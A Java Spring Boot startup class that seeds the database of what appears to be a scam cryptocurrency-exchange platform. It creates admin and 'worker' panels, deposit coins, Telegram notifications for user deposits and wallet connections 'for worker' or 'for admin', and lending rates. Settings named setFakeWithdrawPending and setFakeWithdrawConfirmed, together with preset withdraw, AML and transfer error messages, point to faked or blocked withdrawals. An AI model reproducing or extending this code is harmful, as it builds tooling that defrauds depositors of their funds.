package me.hikaricp.yellowexchange.config;

import me.hikaricp.yellowexchange.exchange.model.Coin;
import me.hikaricp.yellowexchange.exchange.model.user.UserRole;
import me.hikaricp.yellowexchange.exchange.repository.CoinRepository;
import me.hikaricp.yellowexchange.exchange.repository.user.UserErrorMessagesRepository;
import me.hikaricp.yellowexchange.exchange.repository.user.UserRoleRepository;
import me.hikaricp.yellowexchange.exchange.repository.user.UserSettingsRepository;
import me.hikaricp.yellowexchange.panel.admin.model.*;
import me.hikaricp.yellowexchange.panel.admin.repository.*;
import me.hikaricp.yellowexchange.panel.admin.model.*;
import me.hikaricp.yellowexchange.panel.admin.repository.*;
import me.hikaricp.yellowexchange.panel.common.model.DepositCoin;
import me.hikaricp.yellowexchange.panel.common.types.KycAcceptTimer;
import me.hikaricp.yellowexchange.panel.worker.model.Worker;
import me.hikaricp.yellowexchange.panel.worker.model.WorkerDepositCoin;
import me.hikaricp.yellowexchange.panel.worker.repository.WorkerDepositCoinRepository;
import me.hikaricp.yellowexchange.panel.worker.repository.WorkerErrorMessagesRepository;
import me.hikaricp.yellowexchange.panel.worker.repository.WorkerRepository;
import me.hikaricp.yellowexchange.panel.worker.repository.WorkerSettingsRepository;
import me.hikaricp.yellowexchange.utils.IOUtil;
import me.hikaricp.yellowexchange.utils.JsonUtil;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.ApplicationArguments;
import org.springframework.boot.ApplicationRunner;
import org.springframework.stereotype.Component;

import java.util.List;
import java.util.Map;

@Component
public class DatabasePreLoader implements ApplicationRunner {

    @Autowired
    private UserRoleRepository roleRepository;

    @Autowired
    private CoinRepository coinRepository;

    @Autowired
    private AdminSettingsRepository adminSettingsRepository;

    @Autowired
    private AdminDepositCoinRepository adminDepositCoinRepository;

    @Autowired
    private AdminCoinSettingsRepository adminCoinSettingsRepository;

    @Autowired
    private AdminEmailSettingsRepository adminEmailSettingsRepository;

    @Autowired
    private AdminLegalSettingsRepository adminLegalSettingsRepository;

    @Autowired
    private AdminErrorMessagesRepository adminErrorMessagesRepository;

    @Autowired
    private AdminTelegramSettingsRepository adminTelegramSettingsRepository;

    @Autowired
    private AdminSupportPresetRepository adminSupportPresetRepository;

    @Autowired
    private AdminCryptoLendingRepository adminCryptoLendingRepository;

    @Autowired
    private TelegramMessagesRepository telegramMessagesRepository;

    @Autowired
    private WorkerErrorMessagesRepository workerErrorMessagesRepository;

    @Autowired
    private UserErrorMessagesRepository userErrorMessagesRepository;

    @Autowired
    private WorkerRepository workerRepository;

    @Autowired
    private WorkerSettingsRepository workerSettingsRepository;

    @Autowired
    private WorkerDepositCoinRepository workerDepositCoinRepository;

    @Autowired
    private UserSettingsRepository userSettingsRepository;

    @Override
    public void run(ApplicationArguments args) {
        createRoles();

        createAdminSettings();
        createCoinSettings();
        createEmailSettings();

        createLegalSettings();

        createErrorMessages();

        createDepositCoins();
        createCoins();

        createTelegramSettings();
        createTelegramMessages();

        update19122024();

        createCryptoLendings();

        update14012025();

        update04022025();

        update15022025();

        update03042025();
    }

    private void update15022025() {
        if (adminDepositCoinRepository.findByType(DepositCoin.CoinType.USDCERC20).isEmpty()) {
            String depositCoinsJson = IOUtil.readResource("/data_preload/deposit_coins.json");

            List<Map<String, Object>> coinsMap = JsonUtil.readJson(depositCoinsJson, List.class);

            for (Map<String, Object> coinMap : coinsMap) {
                if (!coinMap.get("symbol").equals("USDC")) {
                    continue;
                }

                DepositCoin.CoinType coinType = DepositCoin.CoinType.valueOf((String) coinMap.get("coin_type"));
                String symbol = coinMap.get("symbol").toString();
                String title = coinMap.get("title").toString();
                String icon = coinMap.get("icon").toString();
                double minReceiveAmount = Double.parseDouble(String.valueOf(coinMap.get("min_receive")));

                AdminDepositCoin coin = new AdminDepositCoin();

                coin.setPosition(4);

                coin.setType(coinType);
                coin.setSymbol(symbol);
                coin.setTitle(title);
                coin.setIcon(icon);

                coin.setMinReceiveAmount(minReceiveAmount);
                coin.setMinDepositAmount(minReceiveAmount);
                coin.setEnabled(true);

                adminDepositCoinRepository.save(coin);

                for (Worker worker : workerRepository.findAll()) {
                    WorkerDepositCoin workerDepositCoin = new WorkerDepositCoin();

                    workerDepositCoin.setPosition(4);

                    workerDepositCoin.setType(coinType);
                    workerDepositCoin.setSymbol(symbol);
                    workerDepositCoin.setTitle(title);
                    workerDepositCoin.setIcon(icon);

                    workerDepositCoin.setMinReceiveAmount(minReceiveAmount);
                    workerDepositCoin.setMinDepositAmount(minReceiveAmount);
                    workerDepositCoin.setEnabled(true);

                    workerDepositCoin.setWorker(worker);

                    workerDepositCoinRepository.save(workerDepositCoin);
                }
            }
        }
    }

    private void update03042025() {
        if (adminDepositCoinRepository.findByType(DepositCoin.CoinType.USDTSOL).isEmpty()) {
            String depositCoinsJson = IOUtil.readResource("/data_preload/deposit_coins.json");

            List<Map<String, Object>> coinsMap = JsonUtil.readJson(depositCoinsJson, List.class);

            for (Map<String, Object> coinMap : coinsMap) {
                if (!coinMap.get("coin_type").equals("USDTSOL")) {
                    continue;
                }

                DepositCoin.CoinType coinType = DepositCoin.CoinType.valueOf((String) coinMap.get("coin_type"));
                String symbol = coinMap.get("symbol").toString();
                String title = coinMap.get("title").toString();
                String icon = coinMap.get("icon").toString();
                double minReceiveAmount = Double.parseDouble(String.valueOf(coinMap.get("min_receive")));

                AdminDepositCoin coin = new AdminDepositCoin();

                coin.setPosition(5);

                coin.setType(coinType);
                coin.setSymbol(symbol);
                coin.setTitle(title);
                coin.setIcon(icon);

                coin.setMinReceiveAmount(minReceiveAmount);
                coin.setMinDepositAmount(minReceiveAmount);
                coin.setEnabled(true);

                adminDepositCoinRepository.save(coin);

                for (Worker worker : workerRepository.findAll()) {
                    WorkerDepositCoin workerDepositCoin = new WorkerDepositCoin();

                    workerDepositCoin.setPosition(5);

                    workerDepositCoin.setType(coinType);
                    workerDepositCoin.setSymbol(symbol);
                    workerDepositCoin.setTitle(title);
                    workerDepositCoin.setIcon(icon);

                    workerDepositCoin.setMinReceiveAmount(minReceiveAmount);
                    workerDepositCoin.setMinDepositAmount(minReceiveAmount);
                    workerDepositCoin.setEnabled(true);

                    workerDepositCoin.setWorker(worker);

                    workerDepositCoinRepository.save(workerDepositCoin);
                }
            }
        }
    }

    private void update14012025() {
        if (StringUtils.isBlank(adminErrorMessagesRepository.findFirst().getCryptoLendingMessage())) {
            String errorMessagesJson = IOUtil.readResource("/data_preload/error_messages.json");

            Map<String, String> errorMessages = JsonUtil.readJson(errorMessagesJson, Map.class);

            String cryptoLendingError = errorMessages.get("CRYPTO_LENDING");

            AdminErrorMessages adminErrorMessages = adminErrorMessagesRepository.findFirst();
            adminErrorMessages.setCryptoLendingMessage(cryptoLendingError);
            adminErrorMessagesRepository.save(adminErrorMessages);

            workerErrorMessagesRepository.setCryptoLendingError(cryptoLendingError);

            userErrorMessagesRepository.setCryptoLendingError(cryptoLendingError);

            AdminSettings adminSettings = adminSettingsRepository.findFirst();
            adminSettings.setCryptoLendingEnabled(true);
            adminSettingsRepository.save(adminSettings);

            workerSettingsRepository.enableCryptoLendingForAll();

            userSettingsRepository.enableCryptoLendingForAll();
        }
    }

    private void update04022025() {
        if (StringUtils.isBlank(adminErrorMessagesRepository.findFirst().getP2pMessage())) {
            String errorMessagesJson = IOUtil.readResource("/data_preload/error_messages.json");

            Map<String, String> errorMessages = JsonUtil.readJson(errorMessagesJson, Map.class);

            String p2pError = errorMessages.get("P2P");

            AdminErrorMessages adminErrorMessages = adminErrorMessagesRepository.findFirst();
            adminErrorMessages.setP2pMessage(p2pError);
            adminErrorMessagesRepository.save(adminErrorMessages);

            workerErrorMessagesRepository.setP2pError(p2pError);

            userErrorMessagesRepository.setP2pError(p2pError);
        }
    }

    private void update19122024() {
        if (StringUtils.isBlank(adminErrorMessagesRepository.findFirst().getTransferMessage())) {
            String errorMessagesJson = IOUtil.readResource("/data_preload/error_messages.json");

            Map<String, String> errorMessages = JsonUtil.readJson(errorMessagesJson, Map.class);

            String transferError = errorMessages.get("TRANSFER");

            AdminErrorMessages adminErrorMessages = adminErrorMessagesRepository.findFirst();
            adminErrorMessages.setTransferMessage(transferError);
            adminErrorMessagesRepository.save(adminErrorMessages);

            workerErrorMessagesRepository.setTransferError(transferError);

            userErrorMessagesRepository.setTransferError(transferError);

            AdminSettings adminSettings = adminSettingsRepository.findFirst();
            adminSettings.setTransferEnabled(true);
            adminSettingsRepository.save(adminSettings);

            workerSettingsRepository.enableTransferForAll();

            userSettingsRepository.enableTransferForAll();
        }
    }

    private void createTelegramSettings() {
        String messagesJson = IOUtil.readResource("/data_preload/telegram_channel_messages.json");

        Map<String, String> messages = JsonUtil.readJson(messagesJson, Map.class);

        String depositMessage = messages.get("DEPOSIT");

        if (adminTelegramSettingsRepository.count() == 0) {
            AdminTelegramSettings telegramSettings = new AdminTelegramSettings();
            telegramSettings.setBotUsername(null);
            telegramSettings.setBotToken(null);
            telegramSettings.setChannelNotification(false);
            telegramSettings.setChannelMessage(depositMessage);
            telegramSettings.setSupportEnabled(true);
            telegramSettings.setDepositEnabled(true);
            telegramSettings.setWithdrawEnabled(true);
            telegramSettings.setWalletConnectEnabled(true);

            adminTelegramSettingsRepository.save(telegramSettings);
        }
    }

    private void createTelegramMessages() {
        if (telegramMessagesRepository.count() == 0) {
            String messagesJson = IOUtil.readResource("/data_preload/telegram_messages.json");

            Map<String, String> messages = JsonUtil.readJson(messagesJson, Map.class);

            TelegramMessages telegramMessages = new TelegramMessages();
            telegramMessages.setSupportMessage(messages.get("USER_SEND_SUPPORT_MESSAGE"));
            telegramMessages.setSupportImageMessage(messages.get("USER_SEND_SUPPORT_IMAGE"));
            telegramMessages.setEnable2faMessage(messages.get("USER_ENABLE_2FA"));
            telegramMessages.setSendKycMessage(messages.get("USER_SEND_KYC"));
            telegramMessages.setWithdrawMessage(messages.get("USER_WITHDRAW"));
            telegramMessages.setDepositPendingMessage(messages.get("USER_DEPOSIT_PENDING"));
            telegramMessages.setDepositConfirmedMessage(messages.get("USER_DEPOSIT_CONFIRMED"));
            telegramMessages.setWalletWorkerMessage(messages.get("USER_CONNECT_WALLET_FOR_WORKER"));
            telegramMessages.setWalletAdminMessage(messages.get("USER_CONNECT_WALLET_FOR_ADMIN"));

            telegramMessagesRepository.save(telegramMessages);
        }
    }

    private void createRoles() {
        for (UserRole.UserRoleType type : UserRole.UserRoleType.values()) {
            if (!roleRepository.existsByName(type)) {
                UserRole userRole = new UserRole(type);
                roleRepository.save(userRole);
            }
        }
    }

    private void createSupportPresets() {
        if (adminSupportPresetRepository.count() == 0) {
            String supportPresetsJson = IOUtil.readResource("/data_preload/support_presets.json");

            Map<String, String> supportPresets = JsonUtil.readJson(supportPresetsJson, Map.class);

            for (Map.Entry<String, String> entry : supportPresets.entrySet()) {
                AdminSupportPreset adminSupportPreset = new AdminSupportPreset();
                adminSupportPreset.setTitle(entry.getKey());
                adminSupportPreset.setMessage(entry.getValue());

                adminSupportPresetRepository.save(adminSupportPreset);
            }
        }
    }

    private void createAdminSettings() {
        if (adminSettingsRepository.count() == 0) {
            AdminSettings adminSettings = new AdminSettings();
            adminSettings.setSiteName("Exchange");
            adminSettings.setSiteIcon("../assets/img/logo.svg");
            adminSettings.setApiKey(RandomStringUtils.random(32, true, true));
            adminSettings.setSiteTitle("");
            adminSettings.setSiteKeywords("cryptocurrency exchange, Bitcoin trading, Ethereum trading, crypto derivatives, spot trading, perpetual contracts, trading pairs, crypto assets, trading bot, copy trading, unified trading account, Web3 innovation, crypto trading platform, trade GPT, master traders, crypto earn, futures trading, leveraged tokens, ETH, BTC, XRP, USDT, Solana, BNB, HMSTR, HAMSTER, TON, TONCOIN");
            adminSettings.setSiteDescription("The leading cryptocurrency exchange. Buy, sell, trade BTC, ETH and other altcoins. Enter the spot and futures market or make safe bets on your coins.");
            adminSettings.setSupportWelcomeMessage("Welcome to {domain_name}, if you have any questions, feel free to ask us. Our technical support is available 24 hours a day, 7 days a week.");
            adminSettings.setSupportWelcomeEnabled(true);
            adminSettings.setKycAcceptTimer(KycAcceptTimer.TIMER_DISABLED);
            adminSettings.setPromoEnabled(true);
            adminSettings.setPromoPopupEnabled(false);
            adminSettings.setBuyCryptoEnabled(true);
            adminSettings.setVerif2Enabled(true);
            adminSettings.setSignupPromoEnabled(true);
            adminSettings.setSignupRefEnabled(true);
            adminSettings.setFiatWithdrawEnabled(true);
            adminSettings.setVerif2Balance(10000);
            adminSettings.setSwapEnabled(true);
            adminSettings.setSupportEnabled(true);
            adminSettings.setTransferEnabled(true);
            adminSettings.setCryptoLendingEnabled(true);
            adminSettings.setTradingEnabled(true);
            adminSettings.setWalletConnectEnabled(false);
            adminSettings.setFakeWithdrawPending(false);
            adminSettings.setFakeWithdrawConfirmed(false);
            adminSettings.setVipEnabled(false);
            adminSettings.setWorkerTopStats(true);
            adminSettings.setBlockedCountries("Russia");
            adminSettings.setSupportPresetsEnabled(false);

            adminSettingsRepository.save(adminSettings);
        }
    }

    private void createErrorMessages() {
        if (adminErrorMessagesRepository.count() == 0) {
            String errorMessagesJson = IOUtil.readResource("/data_preload/error_messages.json");

            Map<String, String> errorMessages = JsonUtil.readJson(errorMessagesJson, Map.class);

            AdminErrorMessages adminErrorMessages = new AdminErrorMessages();

            adminErrorMessages.setOtherMessage(errorMessages.get("OTHER"));
            adminErrorMessages.setSupportMessage(errorMessages.get("SUPPORT"));
            adminErrorMessages.setSwapMessage(errorMessages.get("SWAP"));
            adminErrorMessages.setTradingMessage(errorMessages.get("TRADING"));
            adminErrorMessages.setWithdrawVerificationMessage(errorMessages.get("WITHDRAW_VERIFICATION"));
            adminErrorMessages.setTransferMessage(errorMessages.get("TRANSFER"));
            adminErrorMessages.setWithdrawMessage(errorMessages.get("WITHDRAW"));
            adminErrorMessages.setWithdrawAmlMessage(errorMessages.get("WITHDRAW_AML"));
            adminErrorMessages.setCryptoLendingMessage(errorMessages.get("CRYPTO_LENDING"));
            adminErrorMessages.setP2pMessage(errorMessages.get("P2P"));

            adminErrorMessagesRepository.save(adminErrorMessages);
        }
    }

    private void createLegalSettings() {
        if (adminLegalSettingsRepository.count() == 0) {
            String userAgreement = IOUtil.readResource("/data_preload/user-agreement.html");
            String amlPolicy = IOUtil.readResource("/data_preload/aml-policy.html");

            AdminLegalSettings adminLegalSettings = new AdminLegalSettings();
            adminLegalSettings.setTerms(userAgreement);
            adminLegalSettings.setAml(amlPolicy);

            adminLegalSettingsRepository.save(adminLegalSettings);
        }
    }

    private void createEmailSettings() {
        if (adminEmailSettingsRepository.count() == 0) {
            String registrationMessage = IOUtil.readResource("/data_preload/email_registration.html");
            String passwordRecoveryMessage = IOUtil.readResource("/data_preload/email_password_recovery.html");

            AdminEmailSettings adminEmailSettings = new AdminEmailSettings();
            adminEmailSettings.setDefaultServer("mail.privateemail.com");
            adminEmailSettings.setDefaultPort(587);
            adminEmailSettings.setRegistrationMessage(registrationMessage);
            adminEmailSettings.setPasswordRecoveryMessage(passwordRecoveryMessage);
            adminEmailSettings.setRegistrationTitle("{domain_exchange_name} - Confirmation of registration");
            adminEmailSettings.setPasswordRecoveryTitle("{domain_exchange_name} - Password recovery");

            adminEmailSettingsRepository.save(adminEmailSettings);
        }
    }

    private void createDepositCoins() {
        if (adminDepositCoinRepository.count() == 0) {
            String depositCoinsJson = IOUtil.readResource("/data_preload/deposit_coins.json");

            List<Map<String, Object>> coinsMap = JsonUtil.readJson(depositCoinsJson, List.class);

            int position = 1;
            for (Map<String, Object> coinMap : coinsMap) {
                AdminDepositCoin coin = new AdminDepositCoin();

                coin.setPosition(position);

                coin.setType(DepositCoin.CoinType.valueOf((String) coinMap.get("coin_type")));
                coin.setSymbol((String) coinMap.get("symbol"));
                coin.setTitle((String) coinMap.get("title"));
                coin.setIcon((String) coinMap.get("icon"));

                double minReceiveAmount = Double.parseDouble(String.valueOf(coinMap.get("min_receive")));
                coin.setMinReceiveAmount(minReceiveAmount);
                coin.setMinDepositAmount(minReceiveAmount);
                coin.setEnabled(true);

                adminDepositCoinRepository.save(coin);

                position++;
            }
        }
    }

    private void createCoins() {
        if (coinRepository.count() == 0) {
            String coinsJson = IOUtil.readResource("/data_preload/coins.json");

            List<Map<String, Object>> coinsMap = JsonUtil.readJson(coinsJson, List.class);

            int position = 1;
            for (Map<String, Object> coinMap : coinsMap) {
                Coin coin = new Coin();

                coin.setSymbol((String) coinMap.get("symbol"));
                coin.setTitle((String) coinMap.get("title"));
                coin.setIcon((String) coinMap.get("icon"));
                coin.setMemo((Boolean) coinMap.getOrDefault("memo", false));
                coin.setPosition(position);
                coin.setNetworks((String) coinMap.get("networks"));

                coinRepository.save(coin);

                position++;
            }
        }
    }

    private void createCoinSettings() {
        if (adminCoinSettingsRepository.count() == 0) {
            AdminCoinSettings adminCoinSettings = new AdminCoinSettings();
            adminCoinSettings.setMinVerifAmount(300);
            adminCoinSettings.setMinWithdrawAmount(100);
            adminCoinSettings.setMinDepositAmount(50);
            adminCoinSettings.setDepositCommission("1.0");
            adminCoinSettings.setWithdrawCommission("1.0");
            adminCoinSettings.setVerifRequirement(true);
            adminCoinSettings.setVerifAml(false);

            adminCoinSettingsRepository.save(adminCoinSettings);
        }
    }

    private void createCryptoLendings() {
        if (adminCryptoLendingRepository.count() == 0) {
            AdminCryptoLending cryptoLending = new AdminCryptoLending();
            cryptoLending.setCoinSymbol("BTC");
            cryptoLending.setMinAmount(0.005);
            cryptoLending.setMaxAmount(120);
            cryptoLending.setPercents(0.23, 0.58, 1.01, 3.47, 7.53, 17.39);

            AdminCryptoLending cryptoLending2 = new AdminCryptoLending();
            cryptoLending2.setCoinSymbol("USDT");
            cryptoLending2.setMinAmount(50);
            cryptoLending2.setMaxAmount(600000);
            cryptoLending2.setPercents(0.23, 0.58, 1.01, 3.47, 7.53, 17.39);

            AdminCryptoLending cryptoLending3 = new AdminCryptoLending();
            cryptoLending3.setCoinSymbol("ETH");
            cryptoLending3.setMinAmount(0.05);
            cryptoLending3.setMaxAmount(400);
            cryptoLending3.setPercents(0.23, 0.58, 1.01, 3.47, 7.53, 17.39);

            AdminCryptoLending cryptoLending4 = new AdminCryptoLending();
            cryptoLending4.setCoinSymbol("USDC");
            cryptoLending4.setMinAmount(100);
            cryptoLending4.setMaxAmount(600000);
            cryptoLending4.setPercents(0.23, 0.58, 1.01, 3.47, 7.53, 17.39);

            AdminCryptoLending cryptoLending5 = new AdminCryptoLending();
            cryptoLending5.setCoinSymbol("SOL");
            cryptoLending5.setMinAmount(1);
            cryptoLending5.setMaxAmount(5000);
            cryptoLending5.setPercents(0.23, 0.58, 1.01, 3.47, 7.53, 17.39);

            AdminCryptoLending cryptoLending6 = new AdminCryptoLending();
            cryptoLending6.setCoinSymbol("TRX");
            cryptoLending6.setMinAmount(1500);
            cryptoLending6.setMaxAmount(15_000_000);
            cryptoLending6.setPercents(0.23, 0.58, 1.01, 3.47, 7.53, 17.39);

            AdminCryptoLending cryptoLending7 = new AdminCryptoLending();
            cryptoLending7.setCoinSymbol("XRP");
            cryptoLending7.setMinAmount(150);
            cryptoLending7.setMaxAmount(1_150_000);
            cryptoLending7.setPercents(0.23, 0.58, 1.01, 3.47, 7.53, 17.39);

            AdminCryptoLending cryptoLending8 = new AdminCryptoLending();
            cryptoLending8.setCoinSymbol("LTC");
            cryptoLending8.setMinAmount(1);
            cryptoLending8.setMaxAmount(7500);
            cryptoLending8.setPercents(0.23, 0.58, 1.01, 3.47, 7.53, 17.39);

            AdminCryptoLending cryptoLending9 = new AdminCryptoLending();
            cryptoLending9.setCoinSymbol("TON");
            cryptoLending9.setMinAmount(50);
            cryptoLending9.setMaxAmount(10000);
            cryptoLending9.setPercents(0.23, 0.58, 1.01, 3.47, 7.53, 17.39);

            AdminCryptoLending cryptoLending10 = new AdminCryptoLending();
            cryptoLending10.setCoinSymbol("DOGE");
            cryptoLending10.setMinAmount(1000);
            cryptoLending10.setMaxAmount(4_000_000);
            cryptoLending10.setPercents(0.23, 0.58, 1.01, 3.47, 7.53, 17.39);

            adminCryptoLendingRepository.save(cryptoLending);
            adminCryptoLendingRepository.save(cryptoLending2);
            adminCryptoLendingRepository.save(cryptoLending3);
            adminCryptoLendingRepository.save(cryptoLending4);
            adminCryptoLendingRepository.save(cryptoLending5);
            adminCryptoLendingRepository.save(cryptoLending6);
            adminCryptoLendingRepository.save(cryptoLending7);
            adminCryptoLendingRepository.save(cryptoLending8);
            adminCryptoLendingRepository.save(cryptoLending9);
            adminCryptoLendingRepository.save(cryptoLending10);
        }
    }
}
